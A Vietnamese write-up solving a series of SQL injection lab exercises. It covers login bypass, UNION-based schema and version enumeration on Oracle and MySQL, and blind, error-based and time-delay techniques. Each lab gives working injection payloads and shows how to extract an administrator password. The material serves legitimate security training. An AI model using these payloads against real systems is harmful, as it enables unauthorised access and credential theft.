## Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
![Image](https://github.com/user-attachments/assets/9890f783-0e29-4a33-98af-dd3cbb9e49bb)

Yêu cầu của lab là thực hiện sqli để hiện ra sản phẩm bị ẩn với câu query:<br>

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Khi vào trang web ấn chọn loại hàng ta sẽ thấy như sau.

![Image](https://github.com/user-attachments/assets/ca3fcb95-31cf-48c1-a8f8-3f3007cc896b)

Loại hàng mà ta chọn được đưa vào param ?category= tương ứng với câu query ở trên.<br>

Theo như logi câu query ở trên thì loại hàng đó phải được release thì mới hiện ra => có thể với category bị ẩn thì câu query sẽ như thế này.

`SELECT * FROM products WHERE category = 'hidden' AND released = 0`

Vậy thì ta sẽ làm cho vế đằng sau AND trở thành luôn đúng.

![Image](https://github.com/user-attachments/assets/96af1a19-8177-4874-bdd9-9c5d9852e831)

Sử dụng toán tử logic thì câu query sẽ trở thành.

`SELECT * FROM products WHERE category = '' or 1=1 -- - AND released = 0`

Lúc này ta sẽ escape được category và để cho một điều kiện logic luôn đúng thì từ đó nó sẽ trả về query cho tất cả các bảng và bỏ qua về từ AND đi.


## Lab: SQL injection vulnerability allowing login bypass

![Image](https://github.com/user-attachments/assets/6ad0cc86-e3c2-4ee8-b292-dcf5e554c333)

Yêu cầu lần này là đăng nhập bằng user **administrator** thông qua sqli.

Lần này ta không được biết câu query nữa mà phải tự đoán, có thể có dạng như sau: <br>

`SELECT * FROM users WHERE username='halo' AND password='conmeo'`

Vẫn với ý tưởng trước đó ta sẽ cố đăng nhập bằng administrator và bỏ phần xử lý password ở phía sau.

Nên payload của ta sẽ như sau: `administrator' -- -`<br>
Lúc này câu query sẽ như sau: `SELECT * FROM users WHERE username='administrator'-- - AND password='conmeo'`

Phần sau admin sẽ bị bỏ qua
![Image](https://github.com/user-attachments/assets/9fd22666-e308-48ee-bbaf-69407576696b)


## Lab: SQL injection attack, querying the database type and version on Oracle

![Image](https://github.com/user-attachments/assets/24cb7381-d809-411e-854e-d521d80d1592)

Bài này ta sẽ dùng union-based để tấn công sqli trên database oracle

![Image](https://github.com/user-attachments/assets/ca644fcd-6c26-401b-9a0c-b8b98082f5fc)

Tuy nhiên khi mình thử dùng hàm version của Oracle thì bị lỗi internal, dù vậy khi dựa vào đây ta cũng có thể biết được rằng dựa vào error này để biết câu query có hợp lệ hay không.<br>

![Image](https://github.com/user-attachments/assets/2e569413-90c4-48b5-86f5-c932c5ab1df1)

Sau khi hỏi chatGPT thì biết được rằng, trong Oracle ta không thể select một function như bên MySQL mà không có vế `from` được.<br>

Chẳng hạn như trong MySQL thì có thể viết: `SELECT version();`<br>

Tuy nhiên nếu làm tương tự trong Oracle thì không được: `SELECT v$version;`<br>

Từ đó bảng **DUAL** được tạo ra để giải quyết vấn về này, đọc thêm tại:
[Document Oracle](https://docs.oracle.com/en/database/oracle/oracle-database/19/sqlrf/Selecting-from-the-DUAL-Table.html), [Blog](https://www.oracletutorial.com/oracle-basics/oracle-dual-table/)

Quay trở lại theo như **UNION-based SQLi** thì đầu tiên ta phải xác định được số cột mà bảng trả về có thể là dùng **order by** hoặc cứ **select** dần cho đủ số cột như cách làm sau đây:

![Image](https://github.com/user-attachments/assets/746a790e-117a-4388-827a-beb27e9117d3)

Thử một cột **abc** thì chưa được, tuy nhiên sau khi thêm một cột nữa lại ok

![Image](https://github.com/user-attachments/assets/01b5667c-e136-4f41-a0cb-66130b3c1cac)

Dựa vào đây ta biết được rằng kết quả query sẽ được in lên màn hình, có một số trường hợp nếu không thấy lỗi nữa mà vẫn không thấy có gì in ra thì ta nên check trong BurpSuite.

Với ý tưởng đó mình lại đi thử tấn công theo cách thông thường trong mysql như sau 

![Image](https://github.com/user-attachments/assets/ee71a1f7-0e0e-47da-a4d7-49b5a79ccf36)

Thì vẫn không được, không biết rằng version của Oracle có khác gì của MySQL không mình tìm hiểu thử

![Image](https://github.com/user-attachments/assets/2cb996de-5ce6-44c6-b04c-de6514407621)

Sau khi tìm hiểu thì version của Oracle nó giống như một table hơn

![Image](https://github.com/user-attachments/assets/88a3ee0d-a2f7-480e-b1f6-c47d1982d020)

Đọc thêm [tại đây](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/V-VERSION.html) 


Dựa vào đó ta lại tiếp tục khai thác, dư kiện hiện tại như sau:
- Oracle dùng bảng **DUAL** như một dummy table để vế **FROM** không bị bỏ trống.
- v$version giống như một cái bảng hơn là hàm.
- Dùng thông tin từ cột **BANNER** để xem version của database.

Cuối cùng ta đã khai thác thành công


![Image](https://github.com/user-attachments/assets/f9cb217f-5a8f-4b22-b831-099441ddedda)

![Image](https://github.com/user-attachments/assets/7ef635c9-2e1f-4cb0-8cdf-3ada5de80c02)

![Image](https://github.com/user-attachments/assets/03cebfc5-0760-49d0-872f-3bee03f8602d)

Câu query của ta như sau:`'union select NULL,BANNER from v$version -- -`

## Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

![Image](https://github.com/user-attachments/assets/92ec7c9b-e3fc-4ab2-8acf-0d762e37f4e1)

Yêu cầu của bài này y hệt bài ở trên tuy nhiên về MySQL thì mình quen hơn Oracle, vì vậy cũng như ý tưởng ở bài trên mình sẽ bắt đầu khai thác

![Image](https://github.com/user-attachments/assets/6cebfbdb-7e2b-42ae-b34e-3c99520873b6)

![Image](https://github.com/user-attachments/assets/5cc4bfe2-ca68-4675-846f-4cccd5338c7f)

Ở bài này mình sẽ sử dụng order by để tìm số cột, chẳng hạn như thay số cột thành 3 thì sẽ bị lỗi

![Image](https://github.com/user-attachments/assets/93fac2bb-3ed4-4e71-bcd5-432c0decc923)

Tiếp đó là tìm version thôi

![Image](https://github.com/user-attachments/assets/1a27ae1e-8da4-4b94-b5bf-a58d805fa128)

![Image](https://github.com/user-attachments/assets/10226310-d01e-4f7f-89f2-6e2d639499e9)

Về căn bản bài này khai thác bằng MySQL cần ít kiến thức hơn Oracle 

Payload: `' union select NULL,version() -- -`

## Lab: SQL injection attack, listing the database contents on non-Oracle databases

![Image](https://github.com/user-attachments/assets/d488c5aa-1e7b-4bc3-91f8-02bee2936734)

Với UNION-based thì đầu tiên mình vẫn sẽ đi tìm số cột

![Image](https://github.com/user-attachments/assets/c0735ffb-a0a1-49b7-bb13-b5b41d68eda3)

Payload:`' union select NULL,version() -- -`

Xác định được số cột là 2, tiếp đến là xác định các table có trong bảng và tìm table có dạng users

![Image](https://github.com/user-attachments/assets/b1416477-679b-48c2-8a2a-e3b79dee7ccc)

![Image](https://github.com/user-attachments/assets/e5e93dfa-6360-43b4-b0d0-b9d49b8ec5de)

Payload:`' union select NULL, table_name from information_schema.tables -- -`

Tiếp đó tìm lần lượt đến các cột trong bảng users

![Image](https://github.com/user-attachments/assets/cda1c0eb-f17e-4be5-951c-ef6ee92a3bda)

Payload:`' union select NULL,column_name from information_schema.columns where table_name = 'users_pjzcyr' -- -`

Sau đó từ 2 cột này ta sẽ lấy thông tin của tất cả user có trong bảng

![Image](https://github.com/user-attachments/assets/8bd5f200-e6a9-4c28-8985-b427f8ace477)

Payload: `union select username_yvexiw, password_vgbnsx from users_pjzcyr -- -`


## Lab: SQL injection attack, listing the database contents on Oracle

Câu này tương tự câu trên chỉ đổi database thôi

Số cột vẫn là 2

![Image](https://github.com/user-attachments/assets/db28e611-64f7-4090-95c0-87a78c4e7e3d)

Payload:`' order by 2 -- -`

Mình đã thử tìm tên table như cách dùng với MySQL tuy nhiên không thành công, sau đó mình đã tìm hiểu và biết được rằng **information_schema** trong Oracle không chứa table_name mà là bẳng ALL_TABLES, đọc thêm: [StackOverflow](https://stackoverflow.com/questions/55037468/oracle-equivalent-of-information-schema-tables), [Document](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TABLES.html)

![Image](https://github.com/user-attachments/assets/d9c446c3-f945-422e-83bb-3082ab8db6b7)

![Image](https://github.com/user-attachments/assets/35622b73-0173-4b79-8d9e-8591cf3a7e76)

Payload:`'union select NULL, table_name from all_tables -- -`

Tìm ra table trong database tiếp theo tìm ra database và cột thôi

Không như MySQL Oracle không chứa **column_name** trong **information_schema** mà chứa trong **all_tab_columns**, đọc thêm: [StackOverflow](https://stackoverflow.com/questions/8739203/oracle-query-to-fetch-column-names), [Document](https://docs.oracle.com/en/database/oracle/oracle-database/19/refrn/ALL_TAB_COLUMNS.html)

![Image](https://github.com/user-attachments/assets/9a30c8f4-a2ce-4040-a704-c75f2f1b7357)

![Image](https://github.com/user-attachments/assets/9830b3a3-f406-4ab7-bcb9-3312647ab88c)

Payload:`' UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name = 'USERS_SUDJWQ' -- -`

![Image](https://github.com/user-attachments/assets/1435ed25-3cff-40c1-9c49-5bf2eb61dee9)

Payload:`'UNION SELECT USERNAME_DGFUYS,PASSWORD_BUIFQE FROM USERS_AKIBVQ -- -`

## Lab: Blind SQL injection with conditional responses

![Image](https://github.com/user-attachments/assets/339a6ba9-908e-41df-89bc-1ed84a6995f3)

Bài này thì SQL sẽ nằm trong trường cookie, nếu như có trả về gì đó thì trang sẽ hiện ra chữ Welcome Back.

![Image](https://github.com/user-attachments/assets/d7fc9c31-c70a-43df-8bf6-2847b0e4653d)

Nếu thay 1=2 thì sẽ không có

![Image](https://github.com/user-attachments/assets/dccbb0dc-9888-4b7f-ac5e-27892b8dd4c4)

Thì sau khi mình mò một hồi mình nhận ra rằng lí do tất cả nhưng câu query không hoạt động là do thiếu vế **AND** bởi vì **or 1=1** hay **or 1=2** sẽ luôn trả về 1 vế luôn đúng hoặc sai nên mới nhận được welcome.

Giả sử câu query luôn có giả trị trả về có nghĩa là nó luôn **true** 
Nên **true or 1=1** hay **true or 1=2** sẽ luôn trả về kết quả

Tuy nhiên nếu muốn kiểm tra tính đúng sai của giá trị thì ta nên dùng toán tử **AND**, bởi dù vế query trước có đúng đi chăng nữa mà vế **AND** bị sao sẽ trả về giá trị ta mong muốn


Bây giờ ta sẽ tiếp tục kiểm tra xem bẳng user có tồn tại hay không bằng 1 trick mình vừa tìm được để trả về kết quả đúng sai

Payload:`' and (select 'a' from users limit 1)='a' --` 

Payload có nghĩa là select kí tự a trong bảng user tuy nhiên đây chỉ là để kiểm tra xem bảng users có tồn tại hay không và so sánh với kí tự a để kiểm tra điều đó

![Image](https://github.com/user-attachments/assets/135f19be-1bea-4ba5-9b50-6bf474fcee9a)


Đây là th sai nên không thấy welcome giờ sẽ thử th đúng

![Image](https://github.com/user-attachments/assets/666989ea-ae36-48ce-a8b1-afd5a1aa7831)

Bây giờ với ý tưởng như vậy ta sẽ tiếp tục tìm tài khoản admin và password

Payload: `' aNd (select 'a' from users WHERE username='administrator')='a'--`

Trường hợp có admin

![Image](https://github.com/user-attachments/assets/1d6eeb51-783a-4c83-803b-8378f036015d)

Sau khi xác định có bảng users và tài khoản admin, tiếp theo ta sẽ kiểm tra độ dài của password để tí nữa bruteforce

Payload:`' and (select 'a' from users where username='administrator' and LENGTH(password)<1)='a' --`

Trường hợp thử length pass lớn hơn 1, sau đó cứ bruteforce dấu = ta sẽ có pass length = 20

![Image](https://github.com/user-attachments/assets/c7aa0a89-da56-4a88-9086-15b5df9afcd2)

Tiếp theo ta sẽ bruteforce pass = intruder với payload

Payload:`' and (select SUBSTRING(password,1,1) from users where username='administrator')='a' --`

![Image](https://github.com/user-attachments/assets/8854e83b-be01-442c-bc5e-afe5a566451f)

Vậy là ta đã biết kí tự đầu tiên của pass là chữ z 

Giải thích thêm hàm SUBSTRING là lấy trong password kí tự đầu tiên và độ dài là 1, tuyến tính như vậy sẽ full 

![Image](https://github.com/user-attachments/assets/c0be7805-22a3-4b44-b2c6-5e92480aa645)

20 kí tự này sẽ là pass: **zjlf82gpvassmldrvwyq**

![Image](https://github.com/user-attachments/assets/fd829bf7-1c2e-4f56-883d-3db620fa475f)


## Lab: Blind SQL injection with conditional errors

![Image](https://github.com/user-attachments/assets/37a4cc44-2cec-4259-9d4f-7f3766b90d93)

Lab này ta sẽ dựa theo error của web để nhận biết

![Image](https://github.com/user-attachments/assets/006506d9-4278-4608-a1b5-a112e88b6a58)

ta dễ dàng thấy được rằng khi có dấu nháy vào thì câu query sẽ không được hoàn chỉnh và bị lỗi, **tiếp theo mình sẽ không kéo xuống dưới để xem nữa mà dựa vào độ dài của response để biết là có lỗi hay không**

Sau đó mình thử cho thêm 1 cặp dấu nháy vào và thấy hết lỗi

![Image](https://github.com/user-attachments/assets/09ec03c6-2f48-4cd9-99f7-f5673951193e)


Ý tưởng tiếp theo sẽ là thực hiện 1 câu query bên trong dấu ngoặc này để kiểm tra xem có lỗi hay không

Cùng với ý tưởng bài trên đây là payload kiểm tra nối câu query
Payload:`'||(SELECT '' FROM dual)||'`

Với payload này nếu thực hiện đúng xong thì dấu nháy sẽ được nối lại nếu sai thì sẽ bị lỗi nên để kiểm tra khá tốt

![Image](https://github.com/user-attachments/assets/c2cc7987-613c-4550-b5d8-024030219966)

Bây giờ với kiểu **select 'a'** như bài trên ta bắt đầu kiểm tra bảng và user có tồn tại hay không

Payload: `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`

![Image](https://github.com/user-attachments/assets/6e13dd77-ac15-4a64-b7e5-75fd7cf89dd0)

Phần **Rownum** sẽ giống như **Limit** bên SQL, thử th bảng không tồn tại thế nào

![Image](https://github.com/user-attachments/assets/14cdae65-a2d1-42cf-baef-6e13e89eea5a)

Tiếp theo sẽ thử đến user admin

Payload:`'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

![Image](https://github.com/user-attachments/assets/5affc344-2222-4f71-95a1-8762053daebd)

Kiểm tra xem user admin có tồn tại hay không

**Tại sao lại if clause lại phải trả ra lỗi?** bởi vì bài này ta dựa vào errors của web để biết được một câu query có đúng hay không.

Tiếp theo sẽ tiếp tục kiểm tra độ dài của pass

Payload:`'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

![Image](https://github.com/user-attachments/assets/2151c221-eb24-40ec-8c1c-e9a769c1a914)


Độ dài pass vẫn là 20 như bài trước 

Tiếp theo lại bruteforce pass 

Payload:`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

![Image](https://github.com/user-attachments/assets/c23e5557-f149-4c92-9dad-7bd0162b3409)

Chữ cái đầu tiên là **x** tiếp tục bruteforce cho đủ

![Image](https://github.com/user-attachments/assets/69725d1c-4578-4a46-a278-07bc86df2385)

![Image](https://github.com/user-attachments/assets/8829012c-9e74-42bd-ac6e-74ab0ab53776)

Password là 20 kí tự này: **xdnuq2j4hvstdtwhv6z6**

## Lab: Visible error-based SQL injection

![Image](https://github.com/user-attachments/assets/aee33852-71ad-4016-9cdc-72f50fd064d1)

Ở lab này eror sẽ được throw thẳng ra từ web, nếu câu query sai

![Image](https://github.com/user-attachments/assets/b4c40f73-fde5-439d-bab4-c94cd6ca1ecb)

Ta sẽ dùng **CAST** trong mysql để check error - CAST sẽ đổi giá trị trả về thành kiểu dữ liệu bất kì, ý tưởng là sẽ dùng cast để nó throw error ra khi kiểu dữ liệu không phù hợp

Payload:`' AND CAST((SELECT 1) AS int)--`

![Image](https://github.com/user-attachments/assets/71effa43-dab0-4c76-ab92-e97102c7932a)

Mình sẽ thử thêm 1 vào để nhầm lẫn input luôn là boolean

Payload:`' AND 1=CAST((SELECT 1) AS int)--`

Tiếp theo sẽ tìm user trong bảng users

Payload:`' AND 1=CAST((SELECT username from users) AS int)--`

Khi mình thử payload này thì thấy rằng nó bị lỗi độ dài

![Image](https://github.com/user-attachments/assets/99b7f428-2af7-47fc-8f14-b3f95c19aae5)

Phần int đã bị mất


![Image](https://github.com/user-attachments/assets/789b41ce-917d-4302-8c80-0bc45a556ff9)

Payload:`' AND 1=CAST((SELECT username from users limit 1) AS int)--`

Do câu query trả về không được quá 1 dòng nên mình đã limit lại

Làm tương tự lấy được pass

![Image](https://github.com/user-attachments/assets/e1c371da-5968-4320-97af-25f48f8642a8)


## Lab: Blind SQL injection with time delays and information retrieval

![Image](https://github.com/user-attachments/assets/0e9bb615-32fd-4a5d-bdf5-846da3225b73)

Bài này ta sẽ dùng time delay để xác định đúng sai, về mặc ý tưởng ý hệt conditional responses chỉ khác về cách nhận biết 1 cái dùng thời gian 1 cái dùng sự thay đổi của trang.

![Image](https://github.com/user-attachments/assets/bb9b6de0-9c0b-4b45-a457-243ecc3f7da9)

Payload:`' || pg_sleep(3) -- -`

Về payload này đầu tiên ta sẽ thoát chuỗi query sau đó nối dài câu query bằng toán tử concat **||** và **sleep** tùy thuộc vào database mà sử dụng concat và sleep khác nhau, sau khi thực thi thì thấy response bị chậm 3s, thử với 5s

![Image](https://github.com/user-attachments/assets/a93b67a9-fdd4-4c61-b4f3-6a1ac9704d5b)

Tiếp theo các bước vẫn như cũ tìm kiếm table, user, pass

Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users) -- -`

Trường hợp có bảng users

![Image](https://github.com/user-attachments/assets/dc654061-20da-4f6a-a1d4-90a4272115f2)

Ta thử một bảng không có xem sao

![Image](https://github.com/user-attachments/assets/66d69ed3-fc46-46ed-be21-3da13ea2ac58)

Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator') -- -`

![Image](https://github.com/user-attachments/assets/bb200dbf-e1b5-447c-8481-2fc88343ec3f)

Tìm độ dài pass

Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND LENGTH(password)=20) -- -`

![Image](https://github.com/user-attachments/assets/5d0b3f76-7340-4b06-8fbe-7a53ae8f1d79)

Sau đó vẫn như các bài trên tìm password

Payload:`'||(SELECT CASE WHEN (2=2) THEN pg_sleep(1) ELSE pg_sleep(0) END FROM users WHERE username='administrator' AND SUBSTRING(password, 1, 1)='a') -- -`

![Image](https://github.com/user-attachments/assets/90868f1b-c70c-46b5-ad0d-dd95ae6f65e4)

Chữ cái đầu là số 3, cứ vậy tiếp tục tìm các chữ cái còn lại

![Image](https://github.com/user-attachments/assets/5f0786f4-ae2f-4aee-985a-7266f5972113)


Password:**3qgwyp0g9bdncslnerut**

![Image](https://github.com/user-attachments/assets/57aff20e-59a2-4cc8-9ed9-19204ae54645)
